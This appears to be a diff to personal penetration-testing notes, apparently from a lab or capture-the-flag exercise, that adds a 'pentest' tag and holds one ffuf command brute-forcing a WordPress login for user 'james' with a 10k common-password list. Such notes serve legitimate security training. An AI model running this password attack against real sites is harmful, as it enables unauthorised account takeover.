@@ -1,8 +1,9 @@
 ---
 category: Uncategorized
-tags: []
----
+tags: [pentest]
+created: 2024-12-21
 
+---
 ### Password attack
 ```bash - kali
 ffuf -X POST -u http://$TARGET:65000//wordpress/wp-login.php -d "log=james&pwd=FUZZ&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.110.100%3A65000%2Fwordpress%2Fwp-admin%2F&testcookie=1" -w /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -fs 5090, 5178
